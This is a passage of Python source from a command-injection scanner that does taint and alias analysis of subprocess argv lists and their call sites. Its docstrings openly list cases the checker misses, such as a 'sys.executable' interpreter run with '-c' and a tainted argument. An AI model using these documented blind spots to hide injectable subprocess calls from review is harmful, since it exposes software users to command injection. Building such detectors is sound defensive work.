        if left is None or right is None:
            return None
        return left + right
    if isinstance(value, ast.BoolOp) and isinstance(value.op, ast.Or):
        shapes = []
        for v in value.values:
            s = _b863_classify_assign_value(v, names, tree, shapes_of)
            if s is None:
                return None
            shapes.extend(s)
        return shapes
    return None


def _b863_fn_bound_names(node):
    args = node.args
    out = {a.arg for a in (*args.posonlyargs, *args.args, *args.kwonlyargs)}
    if args.vararg:
        out.add(args.vararg.arg)
    if args.kwarg:
        out.add(args.kwarg.arg)
    return out


def _b863_expr_escapes(node, names, tree, containers_are_escape=True):
    """True iff a tracked name appears, anywhere within `node`, either bare
    inside a List/Tuple/Set/Dict display (a container escape -- only when
    `containers_are_escape`), or as a bare/starred argument to a call whose
    callee is an in-file def/lambda/class. Used for expression positions the
    top-level statement grammar in `_b863_process_one` does not itself walk
    into -- an Assign's RHS when the TARGET is some other, unrelated name, a
    conditional's test/branches, a Raise/Assert -- where a tracked name is far
    more often just read (a comparison, an f-string, an argument to an
    ordinary/external call) than genuinely escaping, so those reads must NOT
    be flagged.

    `containers_are_escape=False` (only `ast.Return` passes this -- see
    `_b863_process_one`) is a real-corpus finding, not a matrix shape:
    packaging the tracked name into a diagnostic/result dict/list that is
    then RETURNED (`return {"cmd": cmd, "ok": ok}`) is a common, benign
    pattern (confirmed on this machine's own `~/.openclaw` corpus, e.g. a
    subprocess-wrapper helper returning `{"cmd": cmd, "present": False, ...}`
    in its exception branches) -- by the time the function returns, whatever
    reached the SINK earlier in the same function already reached it; nothing
    about a later, terminal `return` can retroactively change that. The
    in-file-callee check still applies (`return poison(cmd)` still escapes)."""
    for n in ast.walk(node):
        if containers_are_escape and isinstance(n, (ast.List, ast.Tuple, ast.Set)):
            for e in n.elts:
                if isinstance(e, ast.Name) and e.id in names:
                    return True
                if isinstance(e, ast.Starred) and isinstance(e.value, ast.Name) and e.value.id in names:
                    return True
        elif containers_are_escape and isinstance(n, ast.Dict):
            for k, v in zip(n.keys, n.values):
                for e in (k, v):
                    if isinstance(e, ast.Name) and e.id in names:
                        return True
        elif isinstance(n, ast.Call):
            touched = any(
                (isinstance(a, ast.Name) and a.id in names)
                or (isinstance(a, ast.Starred) and isinstance(a.value, ast.Name) and a.value.id in names)
                for a in n.args
            ) or any(isinstance(kw.value, ast.Name) and kw.value.id in names for kw in n.keywords)
            if touched:
                callee_name = n.func.id if isinstance(n.func, ast.Name) else None
                if callee_name is not None and any(
                    isinstance(d, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)) and d.name == callee_name
                    for d in ast.walk(tree)
                ):
                    return True
    return False


def _b863_is_isinstance_str_bytes_guard(stmt, names, tree):
    """The one deliberate tier-2 skip besides a rebinding nested scope: `if
    isinstance(P, str)` / `(..., bytes)` / `(str, bytes)` / `str | bytes` --
    every value in the H/F domain is already a list or tuple, so a branch
    that only fires when it is a STRING can never affect this analysis."""
    if not isinstance(stmt, ast.If):
        return False
    t = stmt.test
    if not (isinstance(t, ast.Call) and isinstance(t.func, ast.Name) and t.func.id == "isinstance"):
        return False
    if _name_rebound_anywhere(tree, "isinstance"):
        return False
    if len(t.args) != 2 or not isinstance(t.args[0], ast.Name) or t.args[0].id not in names:
        return False
    ok = {"str", "bytes"}

    def names_ok(n):
        if isinstance(n, ast.Name):
            return n.id in ok
        if isinstance(n, ast.Tuple):
            return all(isinstance(e, ast.Name) and e.id in ok for e in n.elts)
        if isinstance(n, ast.BinOp) and isinstance(n.op, ast.BitOr):
            return names_ok(n.left) and names_ok(n.right)
        return False

    return names_ok(t.args[1])


def _b863_copy_shapes_of(shapes_of):
    """A branch-local snapshot of `shapes_of` for the `ast.If` branch-merge
    below -- fix-round-1 (C-135, 2026-09-23): copies each UNIQUE underlying
    shapes list exactly once (keyed by `id()`), so two names that currently
    share one list (true aliases) still share their own, independently
    mutable copy of it inside the branch, while two names that have already
    diverged keep their own separate copies too. A naive per-name copy would
    silently re-fuse already-diverged aliases back into one list."""
    memo: dict = {}
    out = {}
    for name, lst in shapes_of.items():
        key = id(lst)
        copied = memo.get(key)
        if copied is None:
            copied = [_B863Shape(sh.fresh, sh.a0, sh.content, sh.refs_callsite) for sh in lst]
            memo[key] = copied
        out[name] = copied
    return out


def _b863_process_stmts(stmts, names, tree, shapes_of):
    for stmt in stmts:
        shapes_of = _b863_process_one(stmt, names, tree, shapes_of)
    return shapes_of


def _b863_process_one(stmt, names, tree, shapes_of):
    """Classify one statement's effect on the tracked-name set `names`
    (mutated in place as aliases are discovered) and the current
    `shapes_of` -- a `dict[str, list[_B863Shape]]` giving each tracked name
    its OWN shapes-list slot (fix-round-1, C-135, 2026-09-23; see the module
    comment above `_B863OutOfDomain` for why a single shared list is
    unsound). Two names share the SAME list object exactly when one was
    created as a plain alias of the other and neither has since been
    independently reassigned; `shapes_of[name] = shapes_of[name]` mutation
    (`.add_content`) is therefore visible through every current alias, while
    a full reassignment (`shapes_of[name] = new_list`) affects only that one
    name going forward. Raises `_B863OutOfDomain(("reason", stmt))` for
    anything outside the recognised grammar -- every branch below either
    returns the updated `shapes_of` or raises; see the module comment above
    `_B863OutOfDomain` for how tier 2 and T1c each use the reason."""
    if _b863_is_isinstance_str_bytes_guard(stmt, names, tree):
        return _b863_process_stmts(stmt.orelse, names, tree, shapes_of)

    if isinstance(stmt, ast.Assign) and len(stmt.targets) == 1:
        tgt = stmt.targets[0]
        if isinstance(tgt, ast.Name):
            if tgt.id in names:
                new_shapes = _b863_classify_assign_value(stmt.value, names, tree, shapes_of)
                if new_shapes is None:
                    raise _B863OutOfDomain(("bad_reassign", stmt))
                # Replace ONLY this name's own slot with a brand-new list --
                # any OTHER name that used to share the old list (a stale
                # alias of the value `tgt.id` no longer holds) keeps its own
                # reference to that OLD list, untouched (fix-round-1).
                shapes_of[tgt.id] = new_shapes
                return shapes_of
            src_name = _b863_classify_head(stmt.value, names, tree)
            if src_name is not None:
                names.add(tgt.id)  # new alias of the SAME tracked value
                shapes_of[tgt.id] = shapes_of[src_name]  # share the SAME list -- true aliasing
                return shapes_of
            # target is some OTHER, unrelated name -- the RHS is free to READ
            # a tracked name (e.g. `result = subprocess.run(cmd, ...)`,
            # `msg = f"{cmd}"`); only a genuine escape (bare inside a new
            # container, or forwarded to an in-file callee) is out of domain.
            if _b863_expr_escapes(stmt.value, names, tree):
                raise _B863OutOfDomain(("escape_into_container", stmt))
            return shapes_of
        # target is Subscript/Attribute/Tuple/List -- any tracked-name touch
        # here (the base being stored into, or the value stored) is out of
        # domain (covers `P[:] = ...`, `P[0] = ...`, `obj.attr = P`, ...).
        if _names_in(tgt) & names or _names_in(stmt.value) & names:
            raise _B863OutOfDomain(("store_target", stmt))
        return shapes_of

    if isinstance(stmt, ast.AugAssign):
        if isinstance(stmt.target, ast.Name) and stmt.target.id in names and isinstance(stmt.op, ast.Add):
            for sh in shapes_of[stmt.target.id]:
                sh.add_content(stmt.value)
            return shapes_of
        if _names_in(stmt.target) & names or _names_in(stmt.value) & names:
            raise _B863OutOfDomain(("augassign", stmt))
        return shapes_of

    if isinstance(stmt, ast.Delete):
        for t in stmt.targets:
            if _names_in(t) & names:
                raise _B863OutOfDomain(("delete", stmt))
        return shapes_of

    if isinstance(stmt, ast.Expr) and isinstance(stmt.value, ast.Call):
        call = stmt.value
        f = call.func
        if isinstance(f, ast.Attribute) and isinstance(f.value, ast.Name) and f.value.id in names:
            attr = f.attr
            receiver_shapes = shapes_of[f.value.id]
            if attr == "append" and len(call.args) == 1 and not call.keywords:
                for sh in receiver_shapes:
                    sh.add_content(call.args[0])
                return shapes_of
            if attr == "extend" and len(call.args) == 1 and not call.keywords:
                arg = call.args[0]
                if isinstance(arg, (ast.List, ast.Tuple)) and not (
                    arg.elts and isinstance(arg.elts[0], ast.Starred)
                ):
                    for sh in receiver_shapes:
                        for e in arg.elts:
                            sh.add_content(e)
                else:
                    for sh in receiver_shapes:
                        sh.add_content(arg)
                return shapes_of
            if attr == "insert" and len(call.args) == 2:
                lenarg = call.args[0]
                if (
                    isinstance(lenarg, ast.Call)
                    and isinstance(lenarg.func, ast.Name)
                    and lenarg.func.id == "len"
                    and not _name_rebound_anywhere(tree, "len")
                    and len(lenarg.args) == 1
                    and isinstance(lenarg.args[0], ast.Name)
                    and lenarg.args[0].id in names
                ):
                    for sh in receiver_shapes:
                        sh.add_content(call.args[1])
                    return shapes_of
                raise _B863OutOfDomain(("insert_not_len", stmt))
            if attr == "copy" and not call.args and not call.keywords:
                return shapes_of  # bare, discarded -- a no-op
            raise _B863OutOfDomain(("other_method", stmt))
        # unbound `list.<method>(nm, ...)` / `tuple.<method>(nm, ...)`.
        if (
            isinstance(f, ast.Attribute)
            and isinstance(f.value, ast.Name)
            and f.value.id in ("list", "tuple")
            and not _name_rebound_anywhere(tree, f.value.id)
            and call.args
            and isinstance(call.args[0], ast.Name)
            and call.args[0].id in names
        ):
            raise _B863OutOfDomain(("unbound_method", stmt))
        # a bare tracked name passed (directly, or **starred) to an in-file
        # def/lambda/class -- escape; to anything else, read-only (an
        # accepted residual -- see the module comment above
        # `_B863OutOfDomain`).
        touched = any(
            isinstance(a, ast.Name) and a.id in names
            for a in list(call.args) + [kw.value for kw in call.keywords]
        )
        starred_touched = any(
            isinstance(a, ast.Starred) and isinstance(a.value, ast.Name) and a.value.id in names
            for a in call.args
        )
        if touched or starred_touched:
            callee_name = f.id if isinstance(f, ast.Name) else None
            if callee_name is not None and any(
                isinstance(n, (ast.FunctionDef, ast.AsyncFunctionDef, ast.ClassDef)) and n.name == callee_name
                for n in ast.walk(tree)
            ):
                raise _B863OutOfDomain(("in_file_callee", stmt))
        return shapes_of

    if isinstance(stmt, ast.If):
        # A branch-merge for a tracked name touched inside a plain conditional
        # (the isinstance guard is handled above): "branch taken" (`body`,
        # processed on its own copy of names/shapes_of -- ordinary reads
        # resolve to unchanged shapes via the very same statement grammar,
        # and an actual reassignment produces new shapes exactly as it would
        # unconditionally) and "branch not taken" (`orelse`, or the ORIGINAL
        # shapes_of unchanged when there is no `orelse`) are both kept as
        # possibilities, like an IfExp's two branches. A branch-local alias
        # does not propagate past the `if` (an accepted, unexercised scope
        # limit -- see deviations).
        if not (
            _names_in(stmt.test) & names
            or any(_names_in(s) & names for s in stmt.body)
            or any(_names_in(s) & names for s in stmt.orelse)
        ):
            return shapes_of
        if _b863_expr_escapes(stmt.test, names, tree):
            raise _B863OutOfDomain(("conditional_escape", stmt))
        # Cost cap: each independent conditional doubles the shape count of
        # whichever currently-tracked name has the most shapes. Past this
        # cap, stop branching and fall back to conservative out-of-domain
        # rather than let a pathological file with many independent `if`s
        # reach an unbounded shape count -- the same "unresolvable/
        # unresolved stays crit" discipline `_param_argv_call_sites` itself
        # already uses for its own cost caps.
        max_shapes = max((len(shapes_of[n]) for n in names), default=1)
        if max_shapes * 2 > _B863_MAX_SHAPES:
            raise _B863OutOfDomain(("too_many_branches", stmt))
        body_shapes_of = _b863_process_stmts(
            list(stmt.body), set(names), tree, _b863_copy_shapes_of(shapes_of),
        )
        if stmt.orelse:
            orelse_shapes_of = _b863_process_stmts(
                list(stmt.orelse), set(names), tree, _b863_copy_shapes_of(shapes_of),
            )
        else:
            orelse_shapes_of = shapes_of
        return {n: body_shapes_of[n] + orelse_shapes_of[n] for n in names}

    if isinstance(stmt, (ast.FunctionDef, ast.AsyncFunctionDef)):
        # A nested closure: descend (it can still mutate a tracked name by
        # reference) unless its OWN signature rebinds that name.
        if names & _b863_fn_bound_names(stmt):
            return shapes_of
        return _b863_process_stmts(stmt.body, names, tree, shapes_of)

    if isinstance(stmt, (ast.For, ast.AsyncFor)):
        # Iterating OVER a tracked name (`for a in cmd:`) or its `iter`
        # otherwise merely reading one (`for a in enumerate(cmd):`) is a
        # read, not a mutation -- recurse into the body/orelse with the full
        # statement grammar rather than blanket-refusing the instant the
        # tracked name is merely mentioned in a loop (a real-corpus false
        # positive: a subprocess wrapper's own SINK CALL living inside a
        # `for`/`try`/`with` -- see the `try`/`with` cases below for the
        # concrete repro). A genuine escape in `iter` (e.g. `poison(cmd)`
        # used as the iterable) still refuses.
        if _b863_expr_escapes(stmt.iter, names, tree):
            raise _B863OutOfDomain(("loop_touch", stmt))
        return _b863_process_stmts(stmt.body + stmt.orelse, names, tree, shapes_of)

    if isinstance(stmt, ast.While):
        if _b863_expr_escapes(stmt.test, names, tree):
            raise _B863OutOfDomain(("loop_touch", stmt))
        return _b863_process_stmts(stmt.body + stmt.orelse, names, tree, shapes_of)

    if isinstance(stmt, (ast.With, ast.AsyncWith)):
        for item in stmt.items:
            if _b863_expr_escapes(item.context_expr, names, tree):
                raise _B863OutOfDomain(("with_touch", stmt))
        return _b863_process_stmts(stmt.body, names, tree, shapes_of)

    if isinstance(stmt, ast.Try):
        # The try/except/else/finally bodies get the full statement grammar
        # too -- a `try: subprocess.run(cmd, ...) except OSError: ...` (the
        # single most idiomatic way to call subprocess at all) must not be
        # treated as out of domain merely because the SINK CALL ITSELF (a
        # read-only reference, already correctly classified by the Expr/Call
        # branch above) lives inside the try. Confirmed via this task's own
        # real-corpus differential (cloudinit's `_stream_command_output_to_
        # file`, an ngs-analysis skill's `run_probe`): both wrap their own
        # sink call in exactly this shape and were false-positive-flagged by
        # the earlier, blunt "any touch inside try -> out of domain" rule.
        shapes_of = _b863_process_stmts(stmt.body, names, tree, shapes_of)
        for h in stmt.handlers:
            if h.type is not None and _b863_expr_escapes(h.type, names, tree):
                raise _B863OutOfDomain(("try_touch", stmt))
            shapes_of = _b863_process_stmts(h.body, names, tree, shapes_of)
        shapes_of = _b863_process_stmts(stmt.orelse, names, tree, shapes_of)
        shapes_of = _b863_process_stmts(stmt.finalbody, names, tree, shapes_of)
        return shapes_of

    if isinstance(stmt, ast.Return):
        # A returned container (`return {"cmd": cmd, ...}`) is not an escape
        # -- see `_b863_expr_escapes`'s own docstring; an in-file callee still
        # is (`return poison(cmd)`).
        if _b863_expr_escapes(stmt, names, tree, containers_are_escape=False):
            raise _B863OutOfDomain(("escape_into_container", stmt))
        return shapes_of

    if isinstance(stmt, (ast.Raise, ast.Assert)):
        # Read-only positions (an exception message, an assertion condition/
        # message) -- still checked for a genuine escape (e.g.
        # `raise Bad(poison(cmd))`), never flagged for a plain read
        # (`raise RuntimeError(f"... {cmd} ...")`).
        if _b863_expr_escapes(stmt, names, tree):
            raise _B863OutOfDomain(("escape_into_container", stmt))
        return shapes_of

    if isinstance(stmt, ast.ClassDef):
        if _names_in(stmt) & names:
            raise _B863OutOfDomain(("classdef_touch", stmt))
        return shapes_of

    # Any statement kind not explicitly handled above: read-only mentions are
    # fine (the same `_b863_expr_escapes` standard as Assign-to-other-target
    # and Raise/Assert), a genuine escape still is not.
    if _b863_expr_escapes(stmt, names, tree):
        raise _B863OutOfDomain(("unhandled_stmt", stmt))
    return shapes_of


def _b863_collect_channels(fn, param_name, tree):
    """Returns ('none', None, {param_name}) when the parameter is never
    touched in `fn`'s own body at all (the caller's pre-existing, unchanged
    behaviour applies), ('out_of_domain', reason, names) when tier 2 must
    give crit unconditionally, or ('shapes', [_B863Shape, ...], names)."""
    names = {param_name}
    touched_anywhere = any(
        isinstance(n, ast.Name) and n.id == param_name for n in ast.walk(fn) if n is not fn
    )
    if not touched_anywhere:
        return "none", None, names
    shapes_of = {param_name: [_B863Shape(False, None, [], False)]}
    try:
        shapes_of = _b863_process_stmts(fn.body, names, tree, shapes_of)
    except _B863OutOfDomain as e:
        return "out_of_domain", e.args[0], names
    # `param_name`'s OWN slot specifically -- fix-round-1 (C-135, 2026-09-23):
    # a sibling alias diverging (its own reassignment) no longer overwrites
    # or contaminates this one; see `_b863_process_one`'s module comment.
    return "shapes", shapes_of[param_name], names


def _b863_resolve_call_site(expr, tree, owner_map):
    """The call-site counterpart of the tier-2 walk above: resolves a bound
    call-site expression to its own flat argv elements, `.append()`/
    `.extend()` mutations on the CALL SITE's own local variable included
    (B-863, C-135: a naive one-shot `_single_list_bindings_local`-style
    resolution -- which only tracks the initial literal binding and stops --
    would silently drop a later `c.append(os.environ["X"]); run(c)` at the
    call site, wrongly certifying the whole call fixed; see the harness's
    N7 case). Returns ("literal", elts) for an inline List/Tuple, ("resolved",
    elts) for a Name resolved this way, or ("unresolvable", None)."""
    if isinstance(expr, (ast.List, ast.Tuple)) and expr.elts and not isinstance(expr.elts[0], ast.Starred):
        return "literal", list(expr.elts)
    if isinstance(expr, ast.Name):
        owner = owner_map.get(expr)
        scope = owner if owner is not None else None
        stmts = list(scope.body) if scope is not None and hasattr(scope, "body") else []
        # Only the statements STRICTLY BEFORE the one containing the call site
        # itself matter -- `expr` (e.g. `argv` in `run(argv)`) lives inside the
        # very call this resolves, and `run` is almost always an in-file def,
        # so walking past it would misfire the in-file-callee escape check on
        # the call site's own invocation rather than on some OTHER escape.
        for i, s in enumerate(stmts):
            if any(n is expr for n in ast.walk(s)):
                stmts = stmts[:i]
                break
        names = {expr.id}
        shapes_of = {expr.id: [_B863Shape(False, None, [], False)]}
        try:
            shapes_of = _b863_process_stmts(stmts, names, tree, shapes_of)
        except _B863OutOfDomain:
            return "unresolvable", None
        shapes = shapes_of[expr.id]
        if not shapes or any(not sh.fresh or sh.refs_callsite for sh in shapes):
            return "unresolvable", None
        # A conditional (`if flag: name.append(x)`) branches `shapes` even
        # though every branch shares the SAME initial fresh reassignment --
        # e.g. `command = [sys.executable, ...]` followed by several
        # independent `if opt: command.append(...)` guards. Requiring a
        # single shape here would make every one of those (individually
        # harmless) conditionals collapse the call site to "unresolvable" ->
        # crit. All branches sharing the same a0 is exactly what makes this
        # safe to merge: the danger assessment (`_b863_shape_triggers_crit`)
        # depends on a0 plus the UNION of possible content either way.
        a0_dumps = {ast.dump(sh.a0) for sh in shapes}
        if len(a0_dumps) != 1:
            return "unresolvable", None
        merged_content: list = []
        for sh in shapes:
            merged_content.extend(sh.content)
        return "resolved", [shapes[0].a0] + merged_content
    return "unresolvable", None


def _b863_name_single_load_forwarded_to_fn(name, owner_func, fn_name):
    """T1a's one exception: `name` is a parameter of `owner_func`, and every
    OTHER Load of `name` within `owner_func`'s own body is itself an argument
    in a call to a function literally named `fn_name` -- the "pure forwarding
    wrapper" idiom (`def log(branch): run(['git', 'log', branch])`). A local
    variable that is not itself a parameter (assigned directly from an
    external source, say) does NOT qualify -- see N3 in the harness, where
    the ONLY reason this must stay narrow is that a plain local's provenance
    is fully visible right there, unlike a parameter's."""
    if owner_func is None or not isinstance(owner_func, (ast.FunctionDef, ast.AsyncFunctionDef)):
        return False
    if name not in _b863_fn_bound_names(owner_func):
        return False
    forwarded_ids = set()
    for n in ast.walk(owner_func):
        if isinstance(n, ast.Call) and isinstance(n.func, ast.Name) and n.func.id == fn_name:
            for a in n.args:
                if isinstance(a, ast.Name):
                    forwarded_ids.add(id(a))
                elif isinstance(a, ast.Starred) and isinstance(a.value, ast.Name):
                    forwarded_ids.add(id(a.value))
            for kw in n.keywords:
                if isinstance(kw.value, ast.Name):
                    forwarded_ids.add(id(kw.value))
    for n in ast.walk(owner_func):
        if isinstance(n, ast.Name) and n.id == name and isinstance(n.ctx, ast.Load) and id(n) not in forwarded_ids:
            return False
    return True


def _b863_t1a_call_sites_all_constant(resolved_sites, owner_map, fn_name):
    """T1a: every resolved call-site element is a Constant, except a Name
    that qualifies via `_b863_name_single_load_forwarded_to_fn`."""
    for rkind, elts in resolved_sites:
        if rkind == "unresolvable":
            return False
        for e in elts:
            if isinstance(e, ast.Constant):
                continue
            if isinstance(e, ast.Name) and _b863_name_single_load_forwarded_to_fn(
                e.id, owner_map.get(e), fn_name
            ):
                continue
            return False
    return True


_B863_T1C_ESCAPE_REASONS = frozenset(
    {"escape_into_container", "store_target", "in_file_callee", "classdef_touch"}
)


def _b863_t1c_no_escape(fn, names, tree):
    """T1c: neither the tracked parameter nor a plain alias is passed to an
    in-file def/lambda/class, and it does not escape bare into a container or
    a store value. Reuses the tier-2 walk's own classification: only the
    escape-shaped reasons in `_B863_T1C_ESCAPE_REASONS` disprove T1c -- any
    OTHER out-of-domain reason (a position-unsafe mutation, say) says nothing
    about content-independence, and tier 2 is what catches those."""
    try:
        seed = {n: [_B863Shape(False, None, [], False)] for n in names}
        _b863_process_stmts(list(fn.body), set(names), tree, seed)
    except _B863OutOfDomain as e:
        return e.args[0][0] not in _B863_T1C_ESCAPE_REASONS
    return True


def _b863_m_for(fn, param_name, owner_map, parent_scope, shadow_cache, func_param_taint, ext_taint_map):
    """T1b: is `param_name` visible-tainted at `fn`'s own sink, from anything
    OTHER than its own ordinary per-function parameter taint? Recomputes
    `_external_tainted_names` over `fn`'s own subtree with `param_name`
    excluded from `fn`'s own seed, plus a mutation-propagation fixpoint
    (Call-based append/extend/store-target, and plain-Name alias
    unification) that `_external_tainted_names` itself does not model. See
    the module comment above `_B863OutOfDomain` for why this is a wrapper
    around the existing function rather than a flag inside it."""
    sub = {id(x) for x in ast.walk(fn)}
    inside = {
        s for s in list(ext_taint_map.keys()) + list(func_param_taint.keys())
        if s is not None and id(s) in sub
    }
    seeds = {k: set(v) for k, v in ext_taint_map.items() if k not in inside}
    for k, v in func_param_taint.items():
        if k in inside:
            seeds.setdefault(k, set()).update(v - ({param_name} if k is fn else set()))

    def chain(scope):
        out = []
        while scope is not None and id(scope) in sub:
            out.append(scope)
            scope = parent_scope.get(scope)
        return out

    def sourced(e, vis):
        return (
            _value_is_tainted_source(e, vis)
            or _rhs_has_subscript_environ(e)
            or _rhs_has_fstring_taint(e, vis)
            or bool(_names_in(e) & vis)
        )

    def base_name(node):
        while isinstance(node, (ast.Attribute, ast.Subscript, ast.Starred)):
            node = node.value
        return node.id if isinstance(node, ast.Name) else None

    M = seeds
    for _ in range(6):
        M = _external_tainted_names(fn, {k: set(v) for k, v in seeds.items()}, owner_map, parent_scope, shadow_cache)
        changed = False

        def add(name, node):
            nonlocal changed
            for s in chain(owner_map.get(node)):
                bucket = seeds.setdefault(s, set())
                if name not in bucket:
                    bucket.add(name)
                    changed = True

        for n in ast.walk(fn):
            if isinstance(n, ast.Call) and isinstance(n.func, ast.Attribute):
                # B-863, deviation from the architect's own proto2.py prototype
                # (see deviations_from_design): restricted to METHOD calls whose
                # receiver is a Name (`X.method(...)`), and only propagating
                # sourced argument taint to that receiver -- proto2.py's own
                # blanket "any sourced argument taints EVERY bare-Name argument
                # of ANY call" additionally taints unrelated sibling arguments of
                # an ordinary function call whenever ANY one of them happens to
                # be sourced (a real false positive found via this task's own
                # real-corpus differential: `subprocess.call(cmd, stdout=f,
                # stderr=f)` wrongly tainted `cmd` through the unrelated,
                # independently-sourced `f` file handle in `stdout=`/`stderr=`).
                # A receiver-only rule still covers every 57-case-matrix shape
                # that needs propagation at all (`x.append(sourced)` /
                # `x.extend(sourced)`-style mutation, which is what the fixpoint
                # exists to model), without inventing taint between unrelated
                # co-arguments of a plain call.
                vis = _tainted_names_visible(n, M, owner_map, parent_scope, shadow_cache)
                args = list(n.args) + [kw.value for kw in n.keywords]
                if any(sourced(a, vis) for a in args):
                    b = base_name(n.func.value)
                    if b:
                        add(b, n)
            elif isinstance(n, (ast.Assign, ast.AugAssign)):
                targets = n.targets if isinstance(n, ast.Assign) else [n.target]
                vis = _tainted_names_visible(n, M, owner_map, parent_scope, shadow_cache)
                for t in targets:
                    if isinstance(t, (ast.Subscript, ast.Attribute)) and sourced(n.value, vis):
                        b = base_name(t)
                        if b:
                            add(b, n)
                if (
                    isinstance(n, ast.Assign)
                    and len(targets) == 1
                    and isinstance(targets[0], ast.Name)
                    and isinstance(n.value, ast.Name)
                ):
                    a_, b_ = targets[0].id, n.value.id
                    if a_ in vis and b_ not in vis:
                        add(b_, n)
                    if b_ in vis and a_ not in vis:
                        add(a_, n)
        if not changed:
            break
    return M


def _b863_a0_is_verified_sys_executable(a0, tree):
    """True for `sys.executable` (guarded against a local shadow of `sys`,
    same discipline as `_path_module_aliases`/B-753 for `os`) -- a real-
    corpus finding (this task's own corpus differential over stdlib/dist-
    packages/`~/.openclaw`): re-invoking the CURRENT interpreter via
    `[sys.executable, ...]` is an extremely common, benign idiom, and R1's
    "a fresh a0 must be a str Constant" rule otherwise convicts it outright
    merely for being an Attribute rather than a literal -- it is exactly as
    fixed/non-attacker-influenced as a hardcoded interpreter path, just not
    spelled as one. Deliberately narrow (this one attribute only, not a
    general "any Attribute is fine" carve-out, which would defeat R1)."""
    return (
        isinstance(a0, ast.Attribute)
        and a0.attr == "executable"
        and isinstance(a0.value, ast.Name)
        and a0.value.id == "sys"
        and "sys" not in _rebound_names(tree)[0]
    )


def _b863_shape_triggers_crit(sh, call_elts, call_site_visible, body_visible, tree):
    """Tier 2, R1-R4, for one (`_B863Shape`, call site) pairing. `call_elts`
    is the call site's own resolved R_c; `call_site_visible`/`body_visible`
    are the tainted-name sets used to check content of call-site-origin vs.
    body-origin elements respectively (never the parameter's own blanket
    per-function taint -- see `_B863Shape`'s docstring).

    R2 and R3/R4 share one gate, deliberately: `_argv0_is_shell_indirect_exec`
    is ALREADY the module's own established rule for "does this argv0 make
    the REST of argv into code the program itself parses" -- a re-exec
    wrapper (env/sudo/ssh/...) unconditionally, a scripting interpreter/shell
    only when a literal eval flag (`-c`/`-e`/...) is ALSO present somewhere in
    argv (`python -m mod --flag value` is an ordinary program call, not code
    execution). A prior draft of this function applied that distinction only
    to R3/R4 and had R2 convict a fresh interpreter a0 on ANY non-constant
    element unconditionally, without requiring a real eval-flag -- verified
    against this task's own real-corpus differential to false-positive a
    `[sys.executable, str(reference_script), str(asset_path), "--output", ...]`
    invocation (an ordinary program call, no `-c`/`-m`), which is exactly the
    idiom `_argv0_is_shell_indirect_exec`'s own docstring already carves out.

    A verified `sys.executable` a0 (see `_b863_a0_is_verified_sys_executable`)
    clears R1 outright rather than being fed through the eval-flag check as a
    stand-in "python3": `_argv0_is_shell_indirect_exec` can only ever read a
    literal Constant program name, so it ALREADY cannot recognise `sys.
    executable` as an interpreter either -- the SAME limitation the pre-
    existing `_all_call_sites_bind_fixed_argv`/the sink's own literal-list
    branch both have for this exact attribute, confirmed identical on
    `integration/4.3.0` unmodified. Disclosed, honest narrowing relative to
    that existing baseline, not a new gap this diff invents: a
    `[sys.executable, "-c", tainted]` shape is not caught by this carve-out,
    but it was already not caught by either pre-existing check it mirrors."""
    if sh.fresh:
        a0 = sh.a0
        if _b863_a0_is_verified_sys_executable(a0, tree):
            return False
        if not (isinstance(a0, ast.Constant) and isinstance(a0.value, str)):
            return True  # R1: a fresh, non-constant, unverified program name
        content = list(sh.content)
        if sh.refs_callsite:
            content = content + list(call_elts)
    else:
        if not call_elts:
            return True  # a body channel exists but the call site is empty/unresolved
        a0 = call_elts[0]
        if _b863_a0_is_verified_sys_executable(a0, tree):
            return False
        content = list(call_elts[1:]) + list(sh.content)

    if not _argv0_is_shell_indirect_exec([a0] + content):
        return False
    if sh.fresh and any(not isinstance(c, ast.Constant) for c in content):
        return True  # R2: a fresh, eval-flag-bearing interpreter/re-exec with a non-constant element
    for c in content:  # R3/R4: some content element is tainted
        if _names_in(c) & call_site_visible or _names_in(c) & body_visible:
            return True
    return False


def _b863_tier1_tier2_verdict(
    node, fn, param_name, call_sites, tree, owner_map, parent_scope, shadow_cache,
    ext_taint_map, func_param_taint, layer2_cache,
):
    """B-863: the position-aware replacement for a plain
    `_all_call_sites_bind_fixed_argv` call once `fn`'s OWN body reassigns or
    mutates `param_name` -- see the module comment above `_B863OutOfDomain`
    for the two-tier design. Returns True (crit) / False (info), or None to
    mean "behaviourally identical to no body channel at all -- caller keeps
    the pre-existing `_all_call_sites_bind_fixed_argv` path unchanged".
    `layer2_cache` memoizes the (expensive) channel walk per `fn`, across
    however many call sites/sinks `analyze_python` visits in this file."""
    cache_key = id(fn)
    cached = layer2_cache.get(cache_key) if layer2_cache is not None else None
    if cached is None or cached.get("param") != param_name:
        kind, payload, names = _b863_collect_channels(fn, param_name, tree)
        cached = {"param": param_name, "kind": kind, "payload": payload, "names": names}
        if layer2_cache is not None:
            layer2_cache[cache_key] = cached
    kind = cached["kind"]

    resolved_sites = [_b863_resolve_call_site(expr, tree, owner_map) for expr in call_sites]
    if any(rkind == "unresolvable" for rkind, _ in resolved_sites):
        return True  # unresolvable call site -- crit, as today

    if kind == "none":
        return None
    shapes = cached["payload"] if kind == "shapes" else None
    if kind == "shapes" and len(shapes) == 1 and not shapes[0].fresh and not shapes[0].content:
        return None  # pure identity, no tail -- behaviourally "none"

    names = cached["names"]

    # Tier 1 first: a content-independence proof holds regardless of what
    # tier 2's position grammar can or cannot classify.
    if _b863_t1a_call_sites_all_constant(resolved_sites, owner_map, fn.name):
        if _b863_t1c_no_escape(fn, names, tree):
            M = _b863_m_for(fn, param_name, owner_map, parent_scope, shadow_cache, func_param_taint, ext_taint_map)
            if param_name not in _tainted_names_visible(node, M, owner_map, parent_scope, shadow_cache):
                return False

    # Tier 2.
    if kind == "out_of_domain":
        return True
    for (rkind, elts), expr in zip(resolved_sites, call_sites):
        call_site_visible = _tainted_names_visible(expr, ext_taint_map, owner_map, parent_scope, shadow_cache)
        body_visible = _tainted_names_visible(node, ext_taint_map, owner_map, parent_scope, shadow_cache)
        for sh in shapes:
            if _b863_shape_triggers_crit(sh, elts, call_site_visible, body_visible, tree):
                return True
    return False


def _subprocess_taint_is_command_injection(
    node: ast.Call,
    tainted: set,
    list_bindings: dict[str, ast.List | ast.Tuple] | None = None,
    *,
    tree: ast.AST | None = None,
    owner_map: dict | None = None,
    parent_scope: dict | None = None,
    shadow_cache: dict | None = None,
    ext_taint_map: dict | None = None,
    list_bindings_by_call: dict | None = None,
    func_param_taint: dict | None = None,
    layer2_cache: dict | None = None,
    ref_res: "_RefResolver | None" = None,
) -> bool:
